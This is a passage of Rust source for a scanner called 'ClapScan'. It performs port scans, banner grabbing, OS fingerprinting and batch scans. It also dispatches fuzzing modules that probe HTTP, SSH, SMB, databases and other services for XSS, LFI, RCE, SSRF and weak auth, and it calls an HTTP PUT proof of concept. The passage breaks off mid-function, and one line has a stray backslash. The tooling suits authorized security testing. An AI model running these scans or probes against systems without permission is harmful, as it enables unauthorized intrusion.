use clap::Parser;
use futures::stream::{self, StreamExt};
use serde::Serialize;
use std::{net::SocketAddr, time::Duration};
use tokio::{io::AsyncReadExt, net::TcpStream, time};
use eframe::egui;
use tokio::io::{AsyncWriteExt};
use std::collections::HashMap;
use once_cell::sync::Lazy;
use std::sync::Mutex;
use sha1::{Sha1, Digest};
use md5::Md5;
use sha2::Sha256;
use hmac::{Hmac, Mac};
use base64::{Engine, engine::general_purpose};
use pbkdf2::pbkdf2;

use std::env;
use std::fs;
use std::sync::{mpsc::{self, Receiver, Sender}, Arc, OnceLock};
use directories::UserDirs;

static TOKIO_RT: OnceLock<tokio::runtime::Runtime> = OnceLock::new();

/// Returns the global Tokio runtime instance, initializing it if needed.
fn get_runtime() -> &'static tokio::runtime::Runtime {
    TOKIO_RT.get_or_init(|| {
        tokio::runtime::Runtime::new().expect("Failed to create Tokio runtime")
    })
}

#[derive(Parser, Debug)]
#[command(name = "clapscan", about = "Simple port scanner")]
struct Args {
    #[arg(help = "Target hostname or IP to scan")]
    target: Option<String>,

    #[arg(short = 'p', long = "ports", default_value = "1-1000", help = "Ports or ranges (e.g. 80,443 or 1-1024)")]
    ports: String,

    #[arg(short = 'c', long = "concurrency", default_value = "200", help = "Number of concurrent connection attempts")]
    concurrency: usize,

    #[arg(long = "timeout-ms", default_value = "1000", help = "Timeout per port in milliseconds")]
    timeout_ms: u64,

    #[arg(long = "json", default_value_t = false, help = "Save scan results as JSON in the current directory")]
    json: bool,

    #[arg(long = "fuzz", default_value_t = false, help = "Enable service fuzzing (requires a single port)")]
    fuzz: bool,

    #[arg(long = "wordlist", help = "Wordlist for HTTP path fuzzing")]
    wordlist: Option<String>,

    #[arg(short = 'O', long = "os-detect", default_value_t = false, help = "Heuristic OS detection from banners/ports (use with -p or scans common ports)")]
    os_detect: bool,

    #[arg(long = "ssh-banners", help = "Path to file of host[:port] entries to capture SSH banners and analyze weak algorithms")]
    ssh_banners: Option<String>,

    #[arg(long = "ssh-out", help = "Optional CSV output file for --ssh-banners results")]
    ssh_out: Option<String>,

    #[arg(short = 'a', long = "batch", help = "Batch scan: path to file with targets (one per line)")]
    batch_file: Option<String>,

}
#[derive(Serialize, Clone)]
struct Finding {
    host: String,
    port: u16,
    status: &'static str,
    banner: Option<String>,
    service: Option<ServiceInfo>,
}

fn main() -> anyhow::Result<()> {
    if std::env::args().len() > 1 {
        let rt = tokio::runtime::Runtime::new()?;
        rt.block_on(async_main())
    } else {
        #[cfg(all(windows, not(debug_assertions)))]
        {
            unsafe {
                extern "system" {
                    fn FreeConsole() -> i32;
                }
                FreeConsole();
            }
        }
        let icon = image::load_from_memory(include_bytes!("logo.ico"))
            .ok()
            .and_then(|img| {
                let rgba = img.to_rgba8();
                let (width, height) = rgba.dimensions();
                Some(egui::IconData {
                    rgba: rgba.into_raw(),
                    width,
                    height,
                })
            });

        let locked_size = [600.0, 400.0];
        let options = eframe::NativeOptions {
            viewport: match icon {
                Some(ic) => egui::ViewportBuilder::default()
                    .with_inner_size(locked_size)
                    .with_min_inner_size(locked_size)
                    .with_max_inner_size(locked_size)
                    .with_resizable(false)
                    .with_maximize_button(false)
                    .with_icon(Arc::new(ic)),
                None => egui::ViewportBuilder::default()
                    .with_inner_size(locked_size)
                    .with_min_inner_size(locked_size)
                    .with_max_inner_size(locked_size)
                    .with_resizable(false)
                    .with_maximize_button(false)
                ,
            },
            ..Default::default()
        };
        if let Err(err) = eframe::run_native(
            "ClapScan",
            options,
            Box::new(|_cc| {
                Ok::<Box<dyn eframe::App>, Box<dyn std::error::Error + Send + Sync>>(
                    Box::new(ClapScanApp::default()),
                )
            }),
        ) {
            eprintln!("GUI failed: {err}");
        }
        Ok(())
    }
}

async fn batch_scan(args: &Args, batch_path: &str) -> anyhow::Result<()> {
    batch_scan_to_channel(args, batch_path, None).await
}

async fn batch_scan_to_channel(args: &Args, batch_path: &str, tx: Option<Sender<String>>) -> anyhow::Result<()> {
    let content = fs::read_to_string(batch_path)
        .map_err(|e| anyhow::anyhow!("Failed to read batch file: {}", e))?;
    
    let targets: Vec<&str> = content
        .lines()
        .map(|line| line.trim())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    
    if targets.is_empty() {
        anyhow::bail!("No targets found in batch file");
    }
    
    let msg = format!("[BATCH] File loaded with {} targets loaded\n", targets.len());
    let _ = tx.as_ref().map(|s| s.send(msg.clone()));
    println!("{}", msg.trim());
    
    let mut all_findings = Vec::new();
    
    for (idx, target) in targets.iter().enumerate() {
        let status_msg = format!("[BATCH] [{}/{}] Scanning: {}\n", idx + 1, targets.len(), target);
        let _ = tx.as_ref().map(|s| s.send(status_msg.clone()));
        println!("{}", status_msg.trim());
        
        let start_msg = format!("Resolving: {}\n", target);
        let _ = tx.as_ref().map(|s| s.send(start_msg.clone()));
        
        match scan_target_to_channel(target, args, tx.clone()).await {
            Ok(findings) => {
                all_findings.extend(findings.clone());
                
                if findings.is_empty() {
                    let empty_msg = "  No open ports found\n";
                    let _ = tx.as_ref().map(|s| s.send(empty_msg.to_string()));
                    println!("{}", empty_msg.trim());
                }
                
                if args.os_detect {
                    if let Some(os) = detect_os(&findings) {
                        let os_msg = format!("[OS DETECTION]\n  {}\n", os.name);
                        let _ = tx.as_ref().map(|s| s.send(os_msg.clone()));
                        println!("{}", os_msg.trim());
                    }
                }
                
                if args.fuzz && !findings.is_empty() {
                    let finding = findings.first().unwrap();
                    match run_fuzzing(target, finding.port, args.wordlist.as_ref()).await {
                        Ok(logs) => {
                            for l in logs {
                                let fuzzing_msg = format!("{}\n", l);
                                let _ = tx.as_ref().map(|s| s.send(fuzzing_msg.clone()));
                                println!("{}", fuzzing_msg.trim());
                            }
                        }
                        Err(e) => {
                            let error_msg = format!("[FUZZ ERROR] {}\n", e);
                            let _ = tx.as_ref().map(|s| s.send(error_msg.clone()));
                            eprintln!("{}", error_msg.trim());
                        }
                    }
                }
                
                let _ = tx.as_ref().map(|s| s.send("\n".to_string()));
            }
            Err(e) => {
                let error_msg = format!("[ERROR] Error scanning {}: {}\n", target, e);
                let _ = tx.as_ref().map(|s| s.send(error_msg.clone()));
                eprintln!("{}", error_msg.trim());
            }
        }
    }
    
    let complete_msg = "[BATCH] Scan complete!\n";
    let _ = tx.as_ref().map(|s| s.send(complete_msg.to_string()));
    println!("{}", complete_msg.trim());
    
    if args.json {
        let json_output = serde_json::to_string_pretty(&all_findings)?;
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)?
            .as_secs();
        let filename = format!("scan_results_{}.json", timestamp);
        fs::write(&filename, json_output)?;
        let save_msg = format!("Results saved to: {}\n", filename);
        let _ = tx.as_ref().map(|s| s.send(save_msg.clone()));
        println!("{}", save_msg.trim());
    }
    
    Ok(())
}

/// Scan a single target with channel output for batch scanning
async fn scan_target_to_channel(target: &str, args: &Args, tx: Option<Sender<String>>) -> anyhow::Result<Vec<Finding>> {
    let ports = parse_ports(&args.ports)?;
    let timeout = Duration::from_millis(args.timeout_ms);
    let target_host = target.to_string();
    
    let ip = resolve_host(target).await?;
    let ip_msg = format!("IP: {}\n", ip);
    let _ = tx.as_ref().map(|s| s.send(ip_msg.clone()));
    println!("{}", ip_msg.trim());
    
    let scan_msg = format!("Scanning {} ports...\n", ports.len());
    let _ = tx.as_ref().map(|s| s.send(scan_msg.clone()));
    println!("{}", scan_msg.trim());
    
    let tasks = ports.into_iter().map(|port| {
        let ip = ip;
        let timeout = timeout;
        let host_for_http = target_host.clone();
        async move {
            let addr = SocketAddr::new(ip, port);
            match time::timeout(timeout, TcpStream::connect(addr)).await {
                Ok(Ok(mut stream)) => {
                    let mut buf = [0u8; 128];
                    let banner = match time::timeout(Duration::from_millis(200), stream.read(&mut buf)).await {
                        Ok(Ok(n)) if n > 0 => {
                            let text = String::from_utf8_lossy(&buf[..n]);
                            let cleaned = text
                                .chars()
                                .map(|c| if c.is_ascii() && !c.is_ascii_control() { c } else { '.' })
                                .collect::<String>()
                                .trim()
                                .to_string();
                            if cleaned.is_empty() { None } else { Some(cleaned) }
                        }
                        _ => None,
                    };
                    let service_name = guess_service(port, &banner);
                    let service = match service_name.as_deref() {
                        Some("http") => {
                            match http_head_probe(ip, port, &host_for_http).await {
                                Ok(resp) => Some(fingerprint_http(&resp)),
                                Err(_) => banner.as_ref().map(|b| fingerprint_http(b)),
                            }
                        }
                        Some("ftp") => {
                            banner.as_ref().map(|b| fingerprint_ftp(b))
                        }
                        _ => None,
                    };
                    Some(Finding {
                        host: ip.to_string(),
                        port,
                        status: "open",
                        banner,
                        service,
                    })
                }
                _ => None,
            }
        }
    });
    
    let results: Vec<Finding> = stream::iter(tasks)
        .buffer_unordered(args.concurrency)
        .filter_map(|x| async move { x })
        .collect()
        .await;
    
    for r in &results {
        match &r.banner {
            Some(b) => {
                let msg = format!("{}:{} open | {}\n", r.host, r.port, b);
                let _ = tx.as_ref().map(|s| s.send(msg.clone()));
                println!("{}", msg.trim());
            }
            None => {
                let msg = format!("{}:{} open\n", r.host, r.port);
                let _ = tx.as_ref().map(|s| s.send(msg.clone()));
                println!("{}", msg.trim());
            }
        }
    }
    
    Ok(results)
}

/// Main async entry point: handles CLI args, dispatches scan/fuzz modes, and outputs results.
async fn async_main() -> anyhow::Result<()> {
    if env::args().any(|arg| arg == "--install") {
        return install_to_path().await;
    }
    if env::args().any(|arg| arg == "--uninstall") {
        return uninstall_from_path().await;
    }

    let args = Args::parse();

    if let Some(ref batch_path) = args.batch_file {
        return batch_scan(&args, batch_path).await;
    }

    let target = args.target.clone().ok_or_else(|| {
        anyhow::anyhow!("Target required. Use: clapscan <target> [options] or clapscan -a <file>")
    })?;

    if let Some(ref path) = args.ssh_banners {
        capture_ssh_banners_from_file(path, args.ssh_out.as_deref()).await?;
        return Ok(());
    }

    let ports = parse_ports(&args.ports)?;
    if args.fuzz && ports.len() != 1 {
        anyhow::bail!("--fuzz requires exactly one port (e.g. -p 80)");
    }
    let timeout = Duration::from_millis(args.timeout_ms);
    let target_host = target.clone();

    println!("Starting scan of {} ({} ports)...", target, ports.len());
    let ip = resolve_host(&target).await?;
    println!("Target IP: {}", ip);

    let tasks = ports.into_iter().map(|port| {
        let ip = ip;
        let timeout = timeout;
        let host_for_http = target_host.clone();
        async move {
            let addr = SocketAddr::new(ip, port);
            match time::timeout(timeout, TcpStream::connect(addr)).await {
                Ok(Ok(mut stream)) => {
                    let mut buf = [0u8; 128];
                    let banner = match time::timeout(Duration::from_millis(200), stream.read(&mut buf)).await {
                        Ok(Ok(n)) if n > 0 => {
                            let text = String::from_utf8_lossy(&buf[..n]);
                            let cleaned = text
                                .chars()
                                .map(|c| if c.is_ascii() && !c.is_ascii_control() { c } else { '.' })
                                .collect::<String>()
                                .trim()
                                .to_string();
                            if cleaned.is_empty() { None } else { Some(cleaned) }
                        }
                        _ => None,
                    };
                    let service_name = guess_service(port, &banner);
                    let service = match service_name.as_deref() {
                        Some("http") => {
                            match http_head_probe(ip, port, &host_for_http).await {
                                Ok(resp) => Some(fingerprint_http(&resp)),
                                Err(_) => banner.as_ref().map(|b| fingerprint_http(b)),
                            }
                        }
                        Some("ftp") => {
                            banner.as_ref().map(|b| fingerprint_ftp(b))
                        }
                        _ => None,
                    };
                    Some(Finding {
                        host: ip.to_string(),
                        port,
                        status: "open",
                        banner,
                        service,
                    })
                }
                _ => None,
            }
        }
    });

    let results: Vec<Finding> = stream::iter(tasks)
        .buffer_unordered(args.concurrency)
        .filter_map(|x| async move { x })
        .collect()
        .await;

    for r in &results {
        if let Some(service) = &r.service {
            for rule in apply_rules(service) {
                println!("{}", rule);
            }
        }
    }

    if args.os_detect {
        println!("[SERVICE DETECTION]");
        for r in &results {
            if let Some(service) = &r.service {
                let version_str = service.version.as_deref().unwrap_or("unknown");
                println!("  Port {}: {} ({})", r.port, service.name, version_str);
                for extra in &service.extra {
                    println!("    {}", extra);
                }
            } else {
                let guessed = guess_service(r.port, &r.banner);
                if let Some(svc) = guessed {
                    println!("  Port {}: {}", r.port, svc);
                }
            }
        }

        if let Some(os) = detect_os(&results) {
            println!("[OS DETECTION]");
            println!("  {}", os.name);
        } else {
            println!("[OS DETECTION]");
            println!("  Could not determine OS with confidence");
        }
    }

    let os_info = if args.os_detect {
        detect_os(&results)
    } else {
        None
    };

    let mut module_findings: Vec<CheckResult> = Vec::new();
    let mut fuzz_logs: Vec<String> = Vec::new();

    if args.fuzz {
        if results.is_empty() {
            println!("No open ports found. Cannot fuzz.");
            return Ok(());
        }
        let finding = results.first().unwrap();

        let modules: Vec<Box<dyn ScanModule>> = vec![Box::new(HttpModule)];
        for r in &results {
            for m in &modules {
                if m.supports_port(r.port) {
                    let mut checks = m.run(&target, r.port).await?;
                    module_findings.append(&mut checks);
                }
            }
        }

        for c in &module_findings {
            println!(
                "[CHECK] {}:{} {} vulnerable={}",
                c.target, c.port, c.name, c.vulnerable
            );
            for ev in &c.evidence {
                println!("  - {}", ev);
            }
            if c.vulnerable && c.name == "HTTP PUT Enabled" {
                let poc = poc_http_put(&target, c.port).await?;
                println!("  [POC] {}", poc);
            }
        }

        let logs = run_fuzzing(
            &target,
            finding.port,
            args.wordlist.as_ref(),
        ).await?;
        for l in &logs {
            println!("{}", l);
        }
        fuzz_logs = logs;
    }

    if args.json {
        #[derive(Serialize)]
        struct JsonOutput {
            findings: Vec<Finding>,
            checks: Vec<CheckResult>,
            os_info: Option<OSInfo>,
            fuzz_logs: Vec<String>,
        }

        let output = JsonOutput {
            findings: results.clone(),
            checks: module_findings,
            os_info: os_info.clone(),
            fuzz_logs,
        };

        let json = serde_json::to_string_pretty(&output)?;
        let path = std::env::current_dir()?.join("clapscan_results.json");
        std::fs::write(&path, &json)?;
        println!("Saved JSON to {}", path.display());
    } else {
        let open_ports_count = results.len();
        println!("Scan completed! Found {} open ports:", open_ports_count);
        for r in &results {
            match &r.banner {
                Some(b) => println!("{}:{} open | {}", r.host, r.port, b),
                None => println!("{}:{} open", r.host, r.port),
            }
        }
        if results.is_empty() {
            println!("No open ports found");
        }
    }

    Ok(())
}

/// Installs the ClapScan binary to ~/bin for PATH convenience.
async fn install_to_path() -> anyhow::Result<()> {
    println!("Installing ClapScan to PATH...");
    
    let current_exe = env::current_exe()?;

    let user_dirs = UserDirs::new().ok_or_else(|| anyhow::anyhow!("Could not find user directories"))?;
    let home_dir = user_dirs.home_dir();
    let bin_dir = home_dir.join("bin");
    
    if !bin_dir.exists() {
        fs::create_dir_all(&bin_dir)?;
        println!("Created directory: {}", bin_dir.display());
    }

    let target_path = bin_dir.join("clapscan");
    fs::copy(&current_exe, &target_path)?;
    
    println!("ClapScan installed successfully!");
    println!("Location: {}", target_path.display());
    println!("Example: clapscan google.com -p 80,443");
    println!("");
    println!("To uninstall, run: clapscan --uninstall");
    
    Ok(())
}

/// Removes the ClapScan binary from ~/bin.
async fn uninstall_from_path() -> anyhow::Result<()> {
    println!("Uninstalling ClapScan from PATH...");
    
    let user_dirs = UserDirs::new().ok_or_else(|| anyhow::anyhow!("Could not find user directories"))?;
    let home_dir = user_dirs.home_dir();
    let target_path = home_dir.join("bin").join("clapscan.exe");
    
    if target_path.exists() {
        fs::remove_file(&target_path)?;
        println!("ClapScan uninstalled successfully!");
    } else {
        println!("ClapScan not found in PATH");
    }
    
    Ok(())
}

/// Parses port spec string (e.g. "80,443" or "1-1000") into a sorted, deduped list.
fn parse_ports(spec: &str) -> anyhow::Result<Vec<u16>> {
    let mut ports = Vec::new();
    for part in spec.split(',') {
        let p = part.trim();
        if p.contains('-') {
            let (a, b) = p.split_once('-').ok_or_else(|| anyhow::anyhow!("bad port range"))?;
            let a: u16 = a.trim().parse()?;
            let b: u16 = b.trim().parse()?;
            let start = a.min(b);
            let end = a.max(b);
            for port in start..=end {
                ports.push(port);
            }
        } else {
            ports.push(p.parse()?);
        }
    }
    ports.sort_unstable();
    ports.dedup();
    Ok(ports)
}

/// Resolves hostname to IP address; returns IP directly if input is already an IP.
async fn resolve_host(host: &str) -> anyhow::Result<std::net::IpAddr> {
    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        return Ok(ip);
    }
    
    let addrs = tokio::net::lookup_host(format!("{}:0", host)).await?;
    for addr in addrs {
        return Ok(addr.ip());
    }
    
    Err(anyhow::anyhow!("Failed to resolve host: {}", host))
}

/// Performs port scan and optionally fuzzes services; sends results via channel for GUI display.
async fn scan_to_channel(
    target: String,
    ports_spec: String,
    tx: Sender<String>,
    enable_fuzz: bool,
    wordlist: Option<String>,
    os_detect: bool,
) -> anyhow::Result<()> {
    let ports = parse_ports(&ports_spec)?;
    if enable_fuzz && ports.len() != 1 {
        let _ = tx.send("Fuzzing precisa de exatamente uma porta (ex.: -p 80)\n".to_string());
        return Ok(());
    }

    let timeout = Duration::from_millis(1000);

    let _ = tx.send(format!("Resolving {target}...\n"));
    let ip = resolve_host(&target).await?;
    let _ = tx.send(format!("Target IP: {ip}\n"));

    let tasks = ports.into_iter().map(|port| {
        let ip = ip;
        let timeout = timeout;
        async move {
            let addr = SocketAddr::new(ip, port);
            match time::timeout(timeout, TcpStream::connect(addr)).await {
                Ok(Ok(mut stream)) => {
                    let mut buf = [0u8; 128];
                    let banner = match time::timeout(Duration::from_millis(200), stream.read(&mut buf)).await {
                        Ok(Ok(n)) if n > 0 => {
                            let text = String::from_utf8_lossy(&buf[..n]);
                            let cleaned = text
                                .chars()
                                .map(|c| if c.is_ascii() && !c.is_ascii_control() { c } else { '.' })
                                .collect::<String>()
                                .trim()
                                .to_string();
                            if cleaned.is_empty() { None } else { Some(cleaned) }
                        }
                        _ => None,
                    };
                    Some(Finding {
                        host: ip.to_string(),
                        port,
                        status: "open",
                        banner,
                        service: None,
                    })
                }
                _ => None,
            }
        }
    });

    let results: Vec<Finding> = stream::iter(tasks)
        .buffer_unordered(200)
        .filter_map(|x| async move { x })
        .collect()
        .await;

    if results.is_empty() {
        let _ = tx.send("No open ports found\n".to_string());
    } else {
        let _ = tx.send(format!("Found {} open ports:\n", results.len()));
        for r in &results {
            match &r.banner {
                Some(b) => {
                    let _ = tx.send(format!("{}:{} open | {}\n", r.host, r.port, b));
                }
                None => {
                    let _ = tx.send(format!("{}:{} open\n", r.host, r.port));
                }
            }
        }
    }

    if os_detect {
        if let Some(os) = detect_os(&results) {
            let _ = tx.send(format!("[OS] {} (confidence: {}%)\n", os.name, os.confidence));
            for e in os.evidence {
                let _ = tx.send(format!("  - {}\n", e));
            }
        } else {
            let _ = tx.send("[OS] Could not determine OS\n".to_string());
        }
    }

    if enable_fuzz {
        if results.is_empty() {
            let _ = tx.send("No open ports found. Cannot fuzz.\n".to_string());
        } else {
            let finding = results.first().unwrap();
            let logs = run_fuzzing(&target, finding.port, wordlist.as_ref()).await?;
            for l in logs {
                let _ = tx.send(format!("{}\n", l));
            }
        }
    }

    Ok(())
}

struct ClapScanApp {
    target: String,
    ports: String,
    output: String,
    scanning: bool,
    rx: Option<Receiver<String>>,
    enable_fuzz: bool,
    wordlist: String,
    enable_os_detect: bool,
    active_tab: usize,
    progress: f32,
    ssh_hosts_file: String,
    ssh_csv_out: String,
    dark_mode: bool,
    last_results: String,
    batch_file: String,
    use_batch: bool,
}

impl Default for ClapScanApp {
    fn default() -> Self {
        ClapScanApp {
            target: String::new(),
            ports: "1-1000".into(),
            output: String::new(),
            scanning: false,
            rx: None,
            enable_fuzz: false,
            wordlist: String::new(),
            enable_os_detect: false,
            active_tab: 0,
            progress: 0.0,
            ssh_hosts_file: String::new(),
            ssh_csv_out: String::new(),
            dark_mode: true,
            last_results: String::new(),
            batch_file: String::new(),
            use_batch: false,
        }
    }
}

impl eframe::App for ClapScanApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.dark_mode {
            ctx.set_visuals(egui::Visuals::dark());
        } else {
            ctx.set_visuals(egui::Visuals::light());
        }

        if let Some(rx) = &self.rx {
            let mut got_message = false;
            while let Ok(msg) = rx.try_recv() {
                got_message = true;
                if msg == "__DONE__" {
                    self.scanning = false;
                    self.rx = None;
                    self.last_results = self.output.clone();
                    self.progress = 1.0;
                    break;
                } else {
                    self.output.push_str(&msg);
                    if self.progress < 0.9 {
                        self.progress += 0.02;
                    }
                }
            }
            if self.scanning && !got_message && self.progress < 0.9 {
                self.progress += 0.01;
            }
            ctx.request_repaint();
        }

        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.selectable_value(&mut self.active_tab, 0, "Scanner");
                ui.selectable_value(&mut self.active_tab, 1, "SSH Banners");
                ui.selectable_value(&mut self.active_tab, 2, "Results");
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if ui.checkbox(&mut self.dark_mode, "Dark").changed() {}
                    });
            });
        });

        egui::CentralPanel::default().show(ctx, |ui| {

            match self.active_tab {
                0 => {
                    ui.columns(2, |cols| {
                        cols[0].vertical(|ui| {
                            ui.group(|ui| {
                                ui.vertical(|ui| {
                                    ui.label("Target Configuration");
                                    
                                    ui.horizontal(|ui| {
                                        ui.checkbox(&mut self.use_batch, "Batch Scan");
                                    });
                                    
                                    if self.use_batch {
                                        ui.horizontal(|ui| {
                                            ui.label("Batch File:");
                                            ui.text_edit_singleline(&mut self.batch_file);
                                        });
                                    } else {
                                        ui.horizontal(|ui| {
                                            ui.label("Target:");
                                            ui.text_edit_singleline(&mut self.target);
                                        });
                                    }

                                    ui.horizontal(|ui| {
                                        ui.label("Ports:");
                                        ui.text_edit_singleline(&mut self.ports);
                                    });
                                });
                            });

                            ui.group(|ui| {
                                ui.vertical(|ui| {
                                    ui.label("Scan Options");
                                    ui.checkbox(&mut self.enable_fuzz, "Fuzzing");
                                    ui.checkbox(&mut self.enable_os_detect, "OS detection");

                                    ui.horizontal(|ui| {
                                        ui.label("Wordlist:");
                                        ui.text_edit_singleline(&mut self.wordlist);
                                    });
                                });
                            });

                            ui.add_space(12.0);

                            ui.horizontal(|ui| {
                                if ui.button("START SCAN").clicked() && !self.scanning {
                                    self.output.clear();
                                    self.output.push_str("[SCAN] Starting scan...\n");
                                    self.scanning = true;

                                    if self.use_batch {
                                        let batch_file = self.batch_file.clone();
                                        let ports = if self.ports.is_empty() { "1-1000".into() } else { self.ports.clone() };
                                        let enable_fuzz = self.enable_fuzz;
                                        let wordlist = if self.wordlist.trim().is_empty() { None } else { Some(self.wordlist.trim().to_string()) };
                                        let enable_os_detect = self.enable_os_detect;

                                        let (tx, rx) = mpsc::channel();
                                        self.rx = Some(rx);

                                        std::thread::spawn(move || {
                                            let rt = get_runtime();
                                            let temp_args = Args {
                                                target: None,
                                                ports,
                                                concurrency: 200,
                                                timeout_ms: 1000,
                                                json: false,
                                                fuzz: enable_fuzz,
                                                wordlist,
                                                os_detect: enable_os_detect,
                                                ssh_banners: None,
                                                ssh_out: None,
                                                batch_file: Some(batch_file.clone()),
                                            };
                                            if let Err(e) = rt.block_on(async {
                                                batch_scan_to_channel(&temp_args, &batch_file, Some(tx.clone())).await
                                            }) {
                                                let _ = tx.send(format!("[ERROR] {e}\\n"));
                                            }
                                            let _ = tx.send("__DONE__".to_string());
                                        });
                                    } else {
                                        let target = self.target.clone();
                                        let ports = if self.ports.is_empty() { "1-1000".into() } else { self.ports.clone() };
                                        let enable_fuzz = self.enable_fuzz;
                                        let wordlist = if self.wordlist.trim().is_empty() { None } else { Some(self.wordlist.trim().to_string()) };
                                        let enable_os_detect = self.enable_os_detect;

                                        let (tx, rx) = mpsc::channel();
                                        self.rx = Some(rx);

                                        std::thread::spawn(move || {
                                            let rt = get_runtime();
                                            if let Err(e) = rt.block_on(scan_to_channel(target, ports, tx.clone(), enable_fuzz, wordlist, enable_os_detect)) {
                                                let _ = tx.send(format!("[ERROR] {e}\\n"));
                                            }
                                            let _ = tx.send("__DONE__".to_string());
                                        });
                                    }
                                }

                                if ui.button("STOP").clicked() && self.scanning {
                                    self.scanning = false;
                                    self.output.push_str("\\n[SCAN] Stopped.\\n");
                                }

                                if ui.button("CLEAR").clicked() {
                                    self.output.clear();
                                    self.last_results.clear();
                                    self.progress = 0.0;
                                }
                            });

                            if self.scanning {
                                ui.separator();
                                ui.label("Scanning in progress...");
                                ui.add(egui::ProgressBar::new(self.progress).show_percentage());
                            }
                        });

                        cols[1].vertical(|ui| {
                            ui.label("Live Output:");
                            ui.add_sized(
                                [ui.available_width(), 400.0],
                                egui::TextEdit::multiline(&mut self.output),
                            );
                        });
                    });
                },
                1 => {
                    ui.vertical(|ui| {
                        ui.label("SSH Banner Capture & CVE Analysis");
                        ui.horizontal(|ui| {
                            ui.label("Hosts file (host:port):");
                            ui.text_edit_singleline(&mut self.ssh_hosts_file);
                        });
                        ui.horizontal(|ui| {
                            ui.label("CSV output:");
                            ui.text_edit_singleline(&mut self.ssh_csv_out);
                        });
                        if ui.button("Load & Analyze Banners").clicked() {
                            self.output.push_str("[SSH] Feature available via --ssh-banners CLI option\\n");
                        }
                    });
                },
                2 => {
                    ui.vertical(|ui| {
                        ui.horizontal(|ui| {
                            if ui.button("Export JSON").clicked() {
                                self.output.push_str("[EXPORT] JSON export feature\\n");
                            }
                            if ui.button("Export CSV").clicked() {
                                self.output.push_str("[EXPORT] CSV export feature\\n");
                            }
                            if ui.button("Clear Results").clicked() {
                                self.output.clear();
                                self.last_results.clear();
                            }
                        });
                        ui.separator();
                        ui.label("Saved Results:");
                        ui.add_sized(
                            [ui.available_width(), 400.0],
                            egui::TextEdit::multiline(&mut self.last_results),
                        );
                    });
                },
                _ => {}
            }
        });
    }
}

/// Dispatches protocol-specific fuzzing modules based on port number.
async fn run_fuzzing(
    target: &str,
    port: u16,
    wordlist: Option<&String>,
) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();\
    logs.push(format!("[FUZZ] Starting fuzzing on {}:{}", target, port));

    match port {
        80 | 443 | 8080 => {
            logs.push("[FUZZ][HTTP] Detected HTTP service".into());

            if is_http_service(target, port).await? {
                let http_cve_logs = detect_http_version_cves(target, port).await?;
                logs.extend(http_cve_logs);

                let methods = discover_http_methods(target, port).await?;
                logs.push(format!("[FUZZ][HTTP] Allowed methods: {:?}", methods));

                let findings = fuzz_http_methods_auto(target, port, &methods).await?;
                for f in findings {
                    logs.push(format!("[FUZZ][HTTP-METHOD] {}", f));
                }

                let uas = fuzz_user_agent(target, port).await?;
                for ua in uas {
                    logs.push(format!("[FUZZ][UA] {}", ua));
                }

                let path_logs = fuzz_http_paths(target, port, wordlist).await?;
                logs.extend(path_logs);

                let xss_logs = fuzz_http_xss(target, port).await?;
                logs.extend(xss_logs);

                let lfi_logs = fuzz_http_lfi(target, port).await?;
                logs.extend(lfi_logs);

                let rce_logs = fuzz_http_rce(target, port).await?;
                logs.extend(rce_logs);
                    let ssrf_logs = fuzz_http_ssrf(target, port).await?;
                    logs.extend(ssrf_logs);

                    let redirect_logs = fuzz_http_open_redirect(target, port).await?;
                    logs.extend(redirect_logs);

                if port == 8080 {
                    let proxy_logs = fuzz_proxy_app_servers(target, port).await?;
                    logs.extend(proxy_logs);
                }
            } else {
                logs.push("[FUZZ][HTTP] Service is not HTTP. Aborting fuzzing.".into());
            }
        }

        389 | 636 => {
            let service = if port == 636 { "[FUZZ][LDAPS]" } else { "[FUZZ][LDAP]" };
            logs.push(format!("{} Detected LDAP service on port {}", service, port));
            let ldap_logs = fuzz_ldap_vulnerabilities(target, port).await?;
            logs.extend(ldap_logs);
        }

        53 => {
            logs.push("[FUZZ][DNS] Detected DNS service".into());
            let dns_logs = fuzz_dns_vulnerabilities(target, port).await?;
            logs.extend(dns_logs);
        }

        21 => {
            logs.push("[FUZZ][FTP] Detected FTP service".into());
            let ftp_logs = fuzz_ftp_auth(target, port).await?;
            logs.extend(ftp_logs);
        }

        22 => {
            logs.push("[FUZZ][SSH] Detected SSH service".into());
            let ssh_cve_logs = detect_ssh_version_cves(target, port).await?;
            logs.extend(ssh_cve_logs);
        }

        3306 => {
            logs.push("[FUZZ][MySQL] Detected MySQL service".into());
            let mysql_logs = fuzz_mysql_vulnerabilities(target, port, None).await?;
            logs.extend(mysql_logs);
        }

        5432 => {
            logs.push("[FUZZ][PostgreSQL] Detected PostgreSQL service".into());
            let pg_logs = fuzz_postgres_vulnerabilities(target, port, None).await?;
            logs.extend(pg_logs);
        }

        139 | 445 => {
            let service_name = if port == 445 { "[FUZZ][SMB]" } else { "[FUZZ][NetBIOS]" };
            logs.push(format!("{} Detected SMB/NetBIOS service on port {}", service_name, port));
            let smb_logs = fuzz_smb_vulnerabilities(target, port).await?;
            logs.extend(smb_logs);
        }

        135 => {
            logs.push("[FUZZ][RPC] Detected RPC Endpoint Mapper service".into());
            let rpc_logs = fuzz_rpc_vulnerabilities(target, port).await?;
            logs.extend(rpc_logs);
        }

        110 => {
            logs.push("[FUZZ][POP3] Detected POP3 service".into());
            let pop3_logs = fuzz_pop3_vulnerabilities(target, port).await?;
            logs.extend(pop3_logs);
        }

        23 => {
            logs.push("[FUZZ][TELNET] Detected Telnet service".into());
            let t_logs = fuzz_telnet_auth(target, port).await?;
            logs.extend(t_logs);
        }

        6379 => {
            logs.push("[FUZZ][REDIS] Detected Redis service".into());
            let redis_logs = fuzz_redis_vulnerabilities(target, port).await?;
            logs.extend(redis_logs);
        }

        11211 => {
            logs.push("[FUZZ][MEMCACHED] Detected memcached service".into());
            let mem_logs = fuzz_memcached_vulnerabilities(target, port).await?;
            logs.extend(mem_logs);
        }

        27017 => {
            logs.push("[FUZZ][MONGODB] Detected MongoDB service".into());
            let mongo_logs = fuzz_mongodb_vulnerabilities(target, port).await?;
            logs.extend(mongo_logs);
        }

        9200 | 5984 => {
